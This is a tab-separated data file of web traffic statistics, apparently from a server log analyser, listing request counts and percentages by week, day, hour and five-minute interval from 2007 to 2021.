W	Rr	1374	0.143	2011	05	15
W	Rr	1076	0.112	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.002	2011	03	20
W	Rr	1317	0.137	2011	03	13
W	Rr	1258	0.131	2011	03	06
W	Rr	1372	0.142	2011	02	27
W	Rr	1226	0.127	2011	02	20
W	Rr	1524	0.158	2011	02	13
W	Rr	1366	0.142	2011	02	06
W	Rr	958	0.099	2011	01	30
W	Rr	1273	0.132	2011	01	23
W	Rr	1560	0.162	2011	01	16
W	Rr	1472	0.153	2011	01	09
W	Rr	1310	0.136	2011	01	02
W	Rr	798	0.083	2010	12	26
W	Rr	935	0.097	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.002	2010	06	27
W	Rr	914	0.095	2010	06	20
W	Rr	1104	0.115	2010	06	13
W	Rr	1096	0.114	2010	06	06
W	Rr	1171	0.122	2010	05	30
W	Rr	1115	0.116	2010	05	23
W	Rr	1170	0.121	2010	05	16
W	Rr	1334	0.138	2010	05	09
W	Rr	1109	0.115	2010	05	02
W	Rr	1067	0.111	2010	04	25
W	Rr	1212	0.126	2010	04	18
W	Rr	1054	0.109	2010	04	11
W	Rr	1325	0.138	2010	04	04
W	Rr	811	0.084	2010	03	28
W	Rr	1195	0.124	2010	03	21
W	Rr	1338	0.139	2010	03	14
W	Rr	1113	0.116	2010	03	07
W	Rr	1103	0.114	2010	02	28
W	Rr	1290	0.134	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.008	2009	12	27
W	Rr	945	0.098	2009	12	20
W	Rr	1140	0.118	2009	12	13
W	Rr	1323	0.137	2009	12	06
W	Rr	1518	0.158	2009	11	29
W	Rr	1352	0.140	2009	11	22
W	Rr	1346	0.140	2009	11	15
W	Rr	1416	0.147	2009	11	08
W	Rr	1734	0.180	2009	11	01
W	Rr	1035	0.107	2009	10	25
W	Rr	1297	0.135	2009	10	18
W	Rr	1267	0.132	2009	10	11
W	Rr	1440	0.149	2009	10	04
W	Rr	1521	0.158	2009	09	27
W	Rr	1121	0.116	2009	09	20
W	Rr	875	0.091	2009	09	13
W	Rr	1032	0.107	2009	09	06
W	Rr	1283	0.133	2009	08	30
W	Rr	1214	0.126	2009	08	23
W	Rr	1402	0.146	2009	08	16
W	Rr	1260	0.131	2009	08	09
W	Rr	1404	0.146	2009	08	02
W	Rr	1380	0.143	2009	07	26
W	Rr	1470	0.153	2009	07	19
W	Rr	1750	0.182	2009	07	12
W	Rr	1847	0.192	2009	07	05
W	Rr	1889	0.196	2009	06	28
W	Rr	1312	0.136	2009	06	21
W	Rr	1093	0.113	2009	06	14
W	Rr	1363	0.141	2009	06	07
W	Rr	1251	0.130	2009	05	31
W	Rr	1352	0.140	2009	05	24
W	Rr	1133	0.118	2009	05	17
W	Rr	1887	0.196	2009	05	10
W	Rr	1369	0.142	2009	05	03
W	Rr	1089	0.113	2009	04	26
W	Rr	1160	0.120	2009	04	19
W	Rr	1189	0.123	2009	04	12
W	Rr	1529	0.159	2009	04	05
W	Rr	1155	0.120	2009	03	29
W	Rr	1230	0.128	2009	03	22
W	Rr	1029	0.107	2009	03	15
W	Rr	1234	0.128	2009	03	08
W	Rr	1486	0.154	2009	03	01
W	Rr	1470	0.153	2009	02	22
W	Rr	1198	0.124	2009	02	15
W	Rr	1802	0.187	2009	02	08
W	Rr	1653	0.172	2009	02	01
W	Rr	1346	0.140	2009	01	25
W	Rr	1431	0.149	2009	01	18
W	Rr	1678	0.174	2009	01	11
W	Rr	1591	0.165	2009	01	04
W	Rr	886	0.092	2008	12	28
W	Rr	1148	0.119	2008	12	21
W	Rr	1428	0.148	2008	12	14
W	Rr	1508	0.157	2008	12	07
W	Rr	1194	0.124	2008	11	30
W	Rr	1070	0.111	2008	11	23
W	Rr	1396	0.145	2008	11	16
W	Rr	1255	0.130	2008	11	09
W	Rr	1314	0.136	2008	11	02
W	Rr	1397	0.145	2008	10	26
W	Rr	1638	0.170	2008	10	19
W	Rr	1298	0.135	2008	10	12
W	Rr	430	0.045	2008	10	05
W	Rr	723	0.075	2008	09	28
W	Rr	1308	0.136	2008	09	21
W	Rr	1242	0.129	2008	09	14
W	Rr	1409	0.146	2008	09	07
W	Rr	1142	0.119	2008	08	31
W	Rr	1022	0.106	2008	08	24
W	Rr	1062	0.110	2008	08	17
W	Rr	1188	0.123	2008	08	10
W	Rr	1232	0.128	2008	08	03
W	Rr	1050	0.109	2008	07	27
W	Rr	1272	0.132	2008	07	20
W	Rr	1305	0.135	2008	07	13
W	Rr	1093	0.113	2008	07	06
W	Rr	1182	0.123	2008	06	29
W	Rr	1937	0.201	2008	06	22
W	Rr	1493	0.155	2008	06	15
W	Rr	1083	0.112	2008	06	08
W	Rr	1283	0.133	2008	06	01
W	Rr	1432	0.149	2008	05	25
W	Rr	1726	0.179	2008	05	18
W	Rr	1580	0.164	2008	05	11
W	Rr	2661	0.276	2008	05	04
W	Rr	3648	0.379	2008	04	27
W	Rr	1400	0.145	2008	04	20
W	Rr	1365	0.142	2008	04	13
W	Rr	1213	0.126	2008	04	06
W	Rr	1670	0.173	2008	03	30
W	Rr	1211	0.126	2008	03	23
W	Rr	1144	0.119	2008	03	16
W	Rr	1301	0.135	2008	03	09
W	Rr	1292	0.134	2008	03	02
W	Rr	1427	0.148	2008	02	24
W	Rr	2207	0.229	2008	02	17
W	Rr	1124	0.117	2008	02	10
W	Rr	1561	0.162	2008	02	03
W	Rr	1533	0.159	2008	01	27
W	Rr	1389	0.144	2008	01	20
W	Rr	1133	0.118	2008	01	13
W	Rr	1404	0.146	2008	01	06
W	Rr	976	0.101	2007	12	30
W	Rr	801	0.083	2007	12	23
W	Rr	675	0.070	2007	12	16
W	*BT	R	7060	2014	02	16
D	Rr	451	0.047	2021	07	02
D	Rr	305	0.032	2021	07	01
D	Rr	507	0.053	2021	06	30
D	Rr	474	0.049	2021	06	29
D	Rr	399	0.041	2021	06	28
D	Rr	388	0.040	2021	06	27
D	Rr	0	0.000	2021	06	26
D	Rr	512	0.053	2021	06	25
D	Rr	330	0.034	2021	06	24
D	Rr	344	0.036	2021	06	23
D	Rr	462	0.048	2021	06	22
D	Rr	402	0.042	2021	06	21
D	Rr	416	0.043	2021	06	20
D	Rr	0	0.000	2021	06	19
D	Rr	362	0.038	2021	06	18
D	Rr	542	0.056	2021	06	17
D	Rr	259	0.027	2021	06	16
D	Rr	386	0.040	2021	06	15
D	Rr	389	0.040	2021	06	14
D	Rr	324	0.034	2021	06	13
D	Rr	0	0.000	2021	06	12
D	Rr	401	0.042	2021	06	11
D	Rr	388	0.040	2021	06	10
D	Rr	473	0.049	2021	06	09
D	Rr	370	0.038	2021	06	08
D	Rr	402	0.042	2021	06	07
D	Rr	230	0.024	2021	06	06
D	Rr	0	0.000	2021	06	05
D	Rr	285	0.030	2021	06	04
D	Rr	352	0.037	2021	06	03
D	Rr	303	0.031	2021	06	02
D	Rr	452	0.047	2021	06	01
D	Rr	386	0.040	2021	05	31
D	Rr	323	0.034	2021	05	30
D	Rr	0	0.000	2021	05	29
D	Rr	1295	0.134	2021	05	28
D	Rr	283	0.029	2021	05	27
D	Rr	340	0.035	2021	05	26
D	Rr	331	0.034	2021	05	25
D	Rr	361	0.037	2021	05	24
D	Rr	399	0.041	2021	05	23
D	Rr	0	0.000	2021	05	22
D	*BT	R	2131	2008	05	03
d	Rr	115003	11.937	Sun
d	Rr	154434	16.029	Mon
d	Rr	157007	16.297	Tue
d	Rr	155235	16.113	Wed
d	Rr	156472	16.241	Thu
d	Rr	148265	15.389	Fri
d	Rr	77024	7.995	Sat
H	Rr	6	0.001	2021	07	02	23
H	Rr	38	0.004	2021	07	02	22
H	Rr	24	0.002	2021	07	02	21
H	Rr	30	0.003	2021	07	02	20
H	Rr	6	0.001	2021	07	02	19
H	Rr	12	0.001	2021	07	02	18
H	Rr	90	0.009	2021	07	02	17
H	Rr	85	0.009	2021	07	02	16
H	Rr	4	0.000	2021	07	02	15
H	Rr	7	0.001	2021	07	02	14
H	Rr	5	0.001	2021	07	02	13
H	Rr	14	0.001	2021	07	02	12
H	Rr	26	0.003	2021	07	02	11
H	Rr	11	0.001	2021	07	02	10
H	Rr	7	0.001	2021	07	02	09
H	Rr	4	0.000	2021	07	02	08
H	Rr	7	0.001	2021	07	02	07
H	Rr	19	0.002	2021	07	02	06
H	Rr	15	0.002	2021	07	02	05
H	Rr	5	0.001	2021	07	02	04
H	Rr	17	0.002	2021	07	02	03
H	Rr	8	0.001	2021	07	02	02
H	Rr	3	0.000	2021	07	02	01
H	Rr	8	0.001	2021	07	02	00
H	Rr	27	0.003	2021	07	01	23
H	Rr	24	0.002	2021	07	01	22
H	Rr	37	0.004	2021	07	01	21
H	Rr	29	0.003	2021	07	01	20
H	Rr	17	0.002	2021	07	01	19
H	Rr	11	0.001	2021	07	01	18
H	Rr	7	0.001	2021	07	01	17
H	Rr	8	0.001	2021	07	01	16
H	Rr	7	0.001	2021	07	01	15
H	Rr	9	0.001	2021	07	01	14
H	Rr	10	0.001	2021	07	01	13
H	Rr	3	0.000	2021	07	01	12
H	Rr	7	0.001	2021	07	01	11
H	Rr	7	0.001	2021	07	01	10
H	Rr	8	0.001	2021	07	01	09
H	Rr	11	0.001	2021	07	01	08
H	Rr	45	0.005	2021	07	01	07
H	Rr	9	0.001	2021	07	01	06
H	Rr	2	0.000	2021	07	01	05
H	Rr	4	0.000	2021	07	01	04
H	Rr	8	0.001	2021	07	01	03
H	Rr	7	0.001	2021	07	01	02
H	Rr	4	0.000	2021	07	01	01
H	Rr	4	0.000	2021	07	01	00
H	Rr	3	0.000	2021	06	30	23
H	Rr	6	0.001	2021	06	30	22
H	Rr	51	0.005	2021	06	30	21
H	Rr	4	0.000	2021	06	30	20
H	Rr	27	0.003	2021	06	30	19
H	Rr	16	0.002	2021	06	30	18
H	Rr	42	0.004	2021	06	30	17
H	Rr	35	0.004	2021	06	30	16
H	Rr	17	0.002	2021	06	30	15
H	Rr	8	0.001	2021	06	30	14
H	Rr	3	0.000	2021	06	30	13
H	Rr	3	0.000	2021	06	30	12
H	Rr	5	0.001	2021	06	30	11
H	Rr	6	0.001	2021	06	30	10
H	Rr	9	0.001	2021	06	30	09
H	Rr	39	0.004	2021	06	30	08
H	Rr	85	0.009	2021	06	30	07
H	Rr	8	0.001	2021	06	30	06
H	Rr	19	0.002	2021	06	30	05
H	Rr	5	0.001	2021	06	30	04
H	Rr	62	0.006	2021	06	30	03
H	Rr	18	0.002	2021	06	30	02
H	Rr	11	0.001	2021	06	30	01
H	Rr	25	0.003	2021	06	30	00
H	*BT	R	750	2020	12	11	23
h	Rr	37981	3.942	00
h	Rr	36762	3.816	01
h	Rr	37607	3.903	02
h	Rr	37008	3.841	03
h	Rr	36009	3.738	04
h	Rr	34058	3.535	05
h	Rr	33635	3.491	06
h	Rr	33305	3.457	07
h	Rr	32024	3.324	08
h	Rr	30523	3.168	09
h	Rr	30263	3.141	10
h	Rr	33771	3.505	11
h	Rr	34402	3.571	12
h	Rr	36405	3.779	13
h	Rr	42117	4.372	14
h	Rr	47384	4.918	15
h	Rr	50785	5.271	16
h	Rr	50733	5.266	17
h	Rr	51934	5.390	18
h	Rr	51448	5.340	19
h	Rr	51287	5.323	20
h	Rr	48026	4.985	21
h	Rr	44238	4.592	22
h	Rr	41735	4.332	23
4	Rr	2	0.000	2021	07	02	23	45
4	Rr	2	0.000	2021	07	02	23	30
4	Rr	0	0.000	2021	07	02	23	15
4	Rr	2	0.000	2021	07	02	23	00
4	Rr	1	0.000	2021	07	02	22	45
4	Rr	30	0.003	2021	07	02	22	30
4	Rr	3	0.000	2021	07	02	22	15
4	Rr	4	0.000	2021	07	02	22	00
4	Rr	20	0.002	2021	07	02	21	45
4	Rr	1	0.000	2021	07	02	21	30
4	Rr	2	0.000	2021	07	02	21	15
4	Rr	1	0.000	2021	07	02	21	00
4	Rr	3	0.000	2021	07	02	20	45
4	Rr	21	0.002	2021	07	02	20	30
4	Rr	3	0.000	2021	07	02	20	15
4	Rr	3	0.000	2021	07	02	20	00
4	Rr	1	0.000	2021	07	02	19	45
4	Rr	0	0.000	2021	07	02	19	30
4	Rr	1	0.000	2021	07	02	19	15
4	Rr	4	0.000	2021	07	02	19	00
4	Rr	4	0.000	2021	07	02	18	45
4	Rr	4	0.000	2021	07	02	18	30
4	Rr	1	0.000	2021	07	02	18	15
4	Rr	3	0.000	2021	07	02	18	00
4	Rr	1	0.000	2021	07	02	17	45
4	Rr	11	0.001	2021	07	02	17	30
4	Rr	5	0.001	2021	07	02	17	15
4	Rr	73	0.008	2021	07	02	17	00
4	Rr	7	0.001	2021	07	02	16	45
4	Rr	6	0.001	2021	07	02	16	30
4	Rr	47	0.005	2021	07	02	16	15
4	Rr	25	0.003	2021	07	02	16	00
4	Rr	2	0.000	2021	07	02	15	45
4	Rr	0	0.000	2021	07	02	15	30
4	Rr	1	0.000	2021	07	02	15	15
4	Rr	1	0.000	2021	07	02	15	00
4	Rr	1	0.000	2021	07	02	14	45
4	Rr	2	0.000	2021	07	02	14	30
4	Rr	3	0.000	2021	07	02	14	15
4	Rr	1	0.000	2021	07	02	14	00
4	Rr	1	0.000	2021	07	02	13	45
4	Rr	1	0.000	2021	07	02	13	30
4	Rr	1	0.000	2021	07	02	13	15
4	Rr	2	0.000	2021	07	02	13	00
4	Rr	2	0.000	2021	07	02	12	45
4	Rr	1	0.000	2021	07	02	12	30
4	Rr	2	0.000	2021	07	02	12	15
4	Rr	9	0.001	2021	07	02	12	00
4	Rr	4	0.000	2021	07	02	11	45
4	Rr	15	0.002	2021	07	02	11	30
4	Rr	4	0.000	2021	07	02	11	15
4	Rr	3	0.000	2021	07	02	11	00
4	Rr	4	0.000	2021	07	02	10	45
4	Rr	5	0.001	2021	07	02	10	30
4	Rr	0	0.000	2021	07	02	10	15
4	Rr	2	0.000	2021	07	02	10	00
4	Rr	3	0.000	2021	07	02	09	45
4	Rr	0	0.000	2021	07	02	09	30
4	Rr	1	0.000	2021	07	02	09	15
4	Rr	3	0.000	2021	07	02	09	00
4	Rr	1	0.000	2021	07	02	08	45
4	Rr	0	0.000	2021	07	02	08	30
4	Rr	3	0.000	2021	07	02	08	15
4	Rr	0	0.000	2021	07	02	08	00
4	Rr	1	0.000	2021	07	02	07	45
4	Rr	1	0.000	2021	07	02	07	30
4	Rr	0	0.000	2021	07	02	07	15
4	Rr	5	0.001	2021	07	02	07	00
4	Rr	16	0.002	2021	07	02	06	45
4	Rr	0	0.000	2021	07	02	06	30
4	Rr	1	0.000	2021	07	02	06	15
4	Rr	2	0.000	2021	07	02	06	00
4	Rr	1	0.000	2021	07	02	05	45
4	Rr	12	0.001	2021	07	02	05	30
4	Rr	2	0.000	2021	07	02	05	15
4	Rr	0	0.000	2021	07	02	05	00
4	Rr	1	0.000	2021	07	02	04	45
4	Rr	1	0.000	2021	07	02	04	30
4	Rr	2	0.000	2021	07	02	04	15
4	Rr	1	0.000	2021	07	02	04	00
4	Rr	1	0.000	2021	07	02	03	45
4	Rr	8	0.001	2021	07	02	03	30
4	Rr	6	0.001	2021	07	02	03	15
4	Rr	2	0.000	2021	07	02	03	00
4	Rr	0	0.000	2021	07	02	02	45
4	Rr	4	0.000	2021	07	02	02	30
4	Rr	1	0.000	2021	07	02	02	15
4	Rr	3	0.000	2021	07	02	02	00
4	Rr	0	0.000	2021	07	02	01	45
4	Rr	1	0.000	2021	07	02	01	30
4	Rr	0	0.000	2021	07	02	01	15
4	Rr	2	0.000	2021	07	02	01	00
4	Rr	1	0.000	2021	07	02	00	45
4	Rr	2	0.000	2021	07	02	00	30
4	Rr	3	0.000	2021	07	02	00	15
4	Rr	2	0.000	2021	07	02	00	00
4	*BT	R	744	2021	04	12	15	00
6	Rr	9446	0.980	00	00
6	Rr	9494	0.985	00	15
6	Rr	9330	0.968	00	30
6	Rr	9711	1.008	00	45
6	Rr	9130	0.948	01	00
6	Rr	9247	0.960	01	15
6	Rr	9342	0.970	01	30
6	Rr	9043	0.939	01	45
6	Rr	8957	0.930	02	00
6	Rr	9784	1.016	02	15
6	Rr	9577	0.994	02	30
6	Rr	9289	0.964	02	45
6	Rr	8995	0.934	03	00
6	Rr	8716	0.905	03	15
6	Rr	9051	0.939	03	30
6	Rr	10246	1.063	03	45
6	Rr	9023	0.937	04	00
6	Rr	9567	0.993	04	15
6	Rr	8403	0.872	04	30
6	Rr	9016	0.936	04	45
6	Rr	8245	0.856	05	00
6	Rr	9018	0.936	05	15
6	Rr	8680	0.901	05	30
6	Rr	8115	0.842	05	45
6	Rr	9162	0.951	06	00
6	Rr	8346	0.866	06	15
6	Rr	8364	0.868	06	30
6	Rr	7763	0.806	06	45
6	Rr	8429	0.875	07	00
6	Rr	8698	0.903	07	15
6	Rr	8687	0.902	07	30
6	Rr	7491	0.778	07	45
6	Rr	8120	0.843	08	00
6	Rr	7820	0.812	08	15
6	Rr	8560	0.888	08	30
6	Rr	7524	0.781	08	45
6	Rr	7704	0.800	09	00
6	Rr	7884	0.818	09	15
6	Rr	7682	0.797	09	30
6	Rr	7253	0.753	09	45
6	Rr	7292	0.757	10	00
6	Rr	7395	0.768	10	15
6	Rr	7580	0.787	10	30
6	Rr	7996	0.830	10	45
6	Rr	9500	0.986	11	00
6	Rr	7972	0.827	11	15
6	Rr	8014	0.832	11	30
6	Rr	8285	0.860	11	45
6	Rr	9595	0.996	12	00
6	Rr	8073	0.838	12	15
6	Rr	8280	0.859	12	30
6	Rr	8454	0.877	12	45
6	Rr	9007	0.935	13	00
6	Rr	8917	0.926	13	15
6	Rr	9575	0.994	13	30
6	Rr	8906	0.924	13	45
6	Rr	10113	1.050	14	00
6	Rr	10565	1.097	14	15
6	Rr	10674	1.108	14	30
6	Rr	10765	1.117	14	45
6	Rr	11816	1.226	15	00
6	Rr	11229	1.166	15	15
6	Rr	11934	1.239	15	30
6	Rr	12405	1.288	15	45
6	Rr	12518	1.299	16	00
6	Rr	12276	1.274	16	15
6	Rr	12877	1.337	16	30
6	Rr	13114	1.361	16	45
6	Rr	12798	1.328	17	00
6	Rr	12600	1.308	17	15
6	Rr	12922	1.341	17	30
6	Rr	12413	1.288	17	45
6	Rr	12493	1.297	18	00
6	Rr	13160	1.366	18	15
6	Rr	13171	1.367	18	30
6	Rr	13110	1.361	18	45
6	Rr	13949	1.448	19	00
6	Rr	12272	1.274	19	15
6	Rr	12746	1.323	19	30
6	Rr	12481	1.295	19	45
6	Rr	13272	1.378	20	00
6	Rr	12715	1.320	20	15
6	Rr	12204	1.267	20	30
6	Rr	13096	1.359	20	45
6	Rr	12826	1.331	21	00
6	Rr	11924	1.238	21	15
6	Rr	11478	1.191	21	30
6	Rr	11798	1.225	21	45
6	Rr	11155	1.158	22	00
6	Rr	11200	1.163	22	15
6	Rr	11047	1.147	22	30
6	Rr	10836	1.125	22	45
6	Rr	11125	1.155	23	00
6	Rr	11174	1.160	23	15
6	Rr	9952	1.033	23	30
6	Rr	9484	0.984	23	45
5	Rr	1	0.000	2021	07	02	23	55
5	Rr	0	0.000	2021	07	02	23	50
5	Rr	1	0.000	2021	07	02	23	45
5	Rr	0	0.000	2021	07	02	23	40
5	Rr	1	0.000	2021	07	02	23	35
5	Rr	1	0.000	2021	07	02	23	30
5	Rr	0	0.000	2021	07	02	23	25
5	Rr	0	0.000	2021	07	02	23	20
5	Rr	0	0.000	2021	07	02	23	15
5	Rr	2	0.000	2021	07	02	23	10
5	Rr	0	0.000	2021	07	02	23	05
5	Rr	0	0.000	2021	07	02	23	00
5	Rr	0	0.000	2021	07	02	22	55
5	Rr	0	0.000	2021	07	02	22	50
5	Rr	1	0.000	2021	07	02	22	45
5	Rr	29	0.003	2021	07	02	22	40
5	Rr	0	0.000	2021	07	02	22	35
5	Rr	1	0.000	2021	07	02	22	30
5	Rr	0	0.000	2021	07	02	22	25
5	Rr	2	0.000	2021	07	02	22	20
5	Rr	1	0.000	2021	07	02	22	15
5	Rr	0	0.000	2021	07	02	22	10
5	Rr	4	0.000	2021	07	02	22	05
5	Rr	0	0.000	2021	07	02	22	00
5	Rr	19	0.002	2021	07	02	21	55
5	Rr	0	0.000	2021	07	02	21	50
5	Rr	1	0.000	2021	07	02	21	45
5	Rr	0	0.000	2021	07	02	21	40
5	Rr	1	0.000	2021	07	02	21	35
5	Rr	0	0.000	2021	07	02	21	30
5	Rr	0	0.000	2021	07	02	21	25
5	Rr	0	0.000	2021	07	02	21	20
5	Rr	2	0.000	2021	07	02	21	15
5	Rr	0	0.000	2021	07	02	21	10
5	Rr	1	0.000	2021	07	02	21	05
5	Rr	0	0.000	2021	07	02	21	00
5	Rr	2	0.000	2021	07	02	20	55
5	Rr	1	0.000	2021	07	02	20	50
5	Rr	0	0.000	2021	07	02	20	45
5	Rr	1	0.000	2021	07	02	20	40
5	Rr	0	0.000	2021	07	02	20	35
5	Rr	20	0.002	2021	07	02	20	30
5	Rr	2	0.000	2021	07	02	20	25
5	Rr	0	0.000	2021	07	02	20	20
5	Rr	1	0.000	2021	07	02	20	15
5	Rr	1	0.000	2021	07	02	20	10
5	Rr	2	0.000	2021	07	02	20	05
5	Rr	0	0.000	2021	07	02	20	00
5	Rr	0	0.000	2021	07	02	19	55
5	Rr	1	0.000	2021	07	02	19	50
5	Rr	0	0.000	2021	07	02	19	45
5	Rr	0	0.000	2021	07	02	19	40
5	Rr	0	0.000	2021	07	02	19	35
5	Rr	0	0.000	2021	07	02	19	30
5	Rr	1	0.000	2021	07	02	19	25
5	Rr	0	0.000	2021	07	02	19	20
5	Rr	0	0.000	2021	07	02	19	15
5	Rr	0	0.000	2021	07	02	19	10
5	Rr	0	0.000	2021	07	02	19	05
5	Rr	4	0.000	2021	07	02	19	00
5	Rr	4	0.000	2021	07	02	18	55
5	Rr	0	0.000	2021	07	02	18	50
5	Rr	0	0.000	2021	07	02	18	45
5	Rr	3	0.000	2021	07	02	18	40
5	Rr	1	0.000	2021	07	02	18	35
5	Rr	0	0.000	2021	07	02	18	30
5	Rr	0	0.000	2021	07	02	18	25
5	Rr	0	0.000	2021	07	02	18	20
5	Rr	1	0.000	2021	07	02	18	15
5	Rr	2	0.000	2021	07	02	18	10
5	Rr	0	0.000	2021	07	02	18	05
5	Rr	1	0.000	2021	07	02	18	00
5	Rr	1	0.000	2021	07	02	17	55
5	Rr	0	0.000	2021	07	02	17	50
5	Rr	0	0.000	2021	07	02	17	45
5	Rr	0	0.000	2021	07	02	17	40
5	Rr	1	0.000	2021	07	02	17	35
5	Rr	10	0.001	2021	07	02	17	30
5	Rr	1	0.000	2021	07	02	17	25
5	Rr	2	0.000	2021	07	02	17	20
5	Rr	2	0.000	2021	07	02	17	15
5	Rr	20	0.002	2021	07	02	17	10
5	Rr	16	0.002	2021	07	02	17	05
5	Rr	37	0.004	2021	07	02	17	00
5	Rr	2	0.000	2021	07	02	16	55
5	Rr	2	0.000	2021	07	02	16	50
5	Rr	3	0.000	2021	07	02	16	45
5	Rr	3	0.000	2021	07	02	16	40
5	Rr	1	0.000	2021	07	02	16	35
5	Rr	2	0.000	2021	07	02	16	30
5	Rr	0	0.000	2021	07	02	16	25
5	Rr	2	0.000	2021	07	02	16	20
5	Rr	45	0.005	2021	07	02	16	15
5	Rr	1	0.000	2021	07	02	16	10
5	Rr	3	0.000	2021	07	02	16	05
5	Rr	21	0.002	2021	07	02	16	00
5	Rr	1	0.000	2021	07	02	15	55
5	Rr	0	0.000	2021	07	02	15	50
5	Rr	1	0.000	2021	07	02	15	45
5	Rr	0	0.000	2021	07	02	15	40
5	Rr	0	0.000	2021	07	02	15	35
5	Rr	0	0.000	2021	07	02	15	30
5	Rr	0	0.000	2021	07	02	15	25
5	Rr	1	0.000	2021	07	02	15	20
5	Rr	0	0.000	2021	07	02	15	15
5	Rr	0	0.000	2021	07	02	15	10
5	Rr	0	0.000	2021	07	02	15	05
5	Rr	1	0.000	2021	07	02	15	00
5	Rr	1	0.000	2021	07	02	14	55
5	Rr	0	0.000	2021	07	02	14	50
5	Rr	0	0.000	2021	07	02	14	45
5	Rr	1	0.000	2021	07	02	14	40
5	Rr	0	0.000	2021	07	02	14	35
5	Rr	1	0.000	2021	07	02	14	30
5	Rr	2	0.000	2021	07	02	14	25
5	Rr	0	0.000	2021	07	02	14	20
5	Rr	1	0.000	2021	07	02	14	15
5	Rr	0	0.000	2021	07	02	14	10
5	Rr	1	0.000	2021	07	02	14	05
5	Rr	0	0.000	2021	07	02	14	00
5	Rr	0	0.000	2021	07	02	13	55
5	Rr	0	0.000	2021	07	02	13	50
5	Rr	1	0.000	2021	07	02	13	45
5	Rr	0	0.000	2021	07	02	13	40
5	Rr	0	0.000	2021	07	02	13	35
5	Rr	1	0.000	2021	07	02	13	30
5	Rr	0	0.000	2021	07	02	13	25
5	Rr	1	0.000	2021	07	02	13	20
5	Rr	0	0.000	2021	07	02	13	15
5	Rr	1	0.000	2021	07	02	13	10
5	Rr	1	0.000	2021	07	02	13	05
5	Rr	0	0.000	2021	07	02	13	00
5	Rr	1	0.000	2021	07	02	12	55
5	Rr	0	0.000	2021	07	02	12	50
5	Rr	1	0.000	2021	07	02	12	45
5	Rr	0	0.000	2021	07	02	12	40
5	Rr	1	0.000	2021	07	02	12	35
5	Rr	0	0.000	2021	07	02	12	30
5	Rr	0	0.000	2021	07	02	12	25
5	Rr	1	0.000	2021	07	02	12	20
5	Rr	1	0.000	2021	07	02	12	15
5	Rr	1	0.000	2021	07	02	12	10
5	Rr	0	0.000	2021	07	02	12	05
5	Rr	8	0.001	2021	07	02	12	00
5	Rr	2	0.000	2021	07	02	11	55
5	Rr	0	0.000	2021	07	02	11	50
5	Rr	2	0.000	2021	07	02	11	45
5	Rr	10	0.001	2021	07	02	11	40
5	Rr	2	0.000	2021	07	02	11	35
5	Rr	3	0.000	2021	07	02	11	30
5	Rr	1	0.000	2021	07	02	11	25
5	Rr	2	0.000	2021	07	02	11	20
5	Rr	1	0.000	2021	07	02	11	15
5	Rr	2	0.000	2021	07	02	11	10
5	Rr	0	0.000	2021	07	02	11	05
5	Rr	1	0.000	2021	07	02	11	00
5	Rr	1	0.000	2021	07	02	10	55
5	Rr	1	0.000	2021	07	02	10	50
5	Rr	2	0.000	2021	07	02	10	45
5	Rr	0	0.000	2021	07	02	10	40
5	Rr	4	0.000	2021	07	02	10	35
5	Rr	1	0.000	2021	07	02	10	30
5	Rr	0	0.000	2021	07	02	10	25
5	Rr	0	0.000	2021	07	02	10	20
5	Rr	0	0.000	2021	07	02	10	15
5	Rr	0	0.000	2021	07	02	10	10
5	Rr	1	0.000	2021	07	02	10	05
5	Rr	1	0.000	2021	07	02	10	00
5	Rr	0	0.000	2021	07	02	09	55
5	Rr	0	0.000	2021	07	02	09	50
5	Rr	3	0.000	2021	07	02	09	45
5	Rr	0	0.000	2021	07	02	09	40
5	Rr	0	0.000	2021	07	02	09	35
5	Rr	0	0.000	2021	07	02	09	30
5	Rr	1	0.000	2021	07	02	09	25
5	Rr	0	0.000	2021	07	02	09	20
5	Rr	0	0.000	2021	07	02	09	15
5	Rr	1	0.000	2021	07	02	09	10
5	Rr	0	0.000	2021	07	02	09	05
5	Rr	2	0.000	2021	07	02	09	00
5	Rr	0	0.000	2021	07	02	08	55
5	Rr	0	0.000	2021	07	02	08	50
5	Rr	1	0.000	2021	07	02	08	45
5	Rr	0	0.000	2021	07	02	08	40
5	Rr	0	0.000	2021	07	02	08	35
5	Rr	0	0.000	2021	07	02	08	30
5	Rr	0	0.000	2021	07	02	08	25
5	Rr	1	0.000	2021	07	02	08	20
5	Rr	2	0.000	2021	07	02	08	15
5	Rr	0	0.000	2021	07	02	08	10
5	Rr	0	0.000	2021	07	02	08	05
5	Rr	0	0.000	2021	07	02	08	00
5	Rr	1	0.000	2021	07	02	07	55
5	Rr	0	0.000	2021	07	02	07	50
5	Rr	0	0.000	2021	07	02	07	45
5	Rr	1	0.000	2021	07	02	07	40
5	Rr	0	0.000	2021	07	02	07	35
5	Rr	0	0.000	2021	07	02	07	30
5	Rr	0	0.000	2021	07	02	07	25
5	Rr	0	0.000	2021	07	02	07	20
5	Rr	0	0.000	2021	07	02	07	15
5	Rr	4	0.000	2021	07	02	07	10
5	Rr	1	0.000	2021	07	02	07	05
5	Rr	0	0.000	2021	07	02	07	00
5	Rr	15	0.002	2021	07	02	06	55
5	Rr	0	0.000	2021	07	02	06	50
5	Rr	1	0.000	2021	07	02	06	45
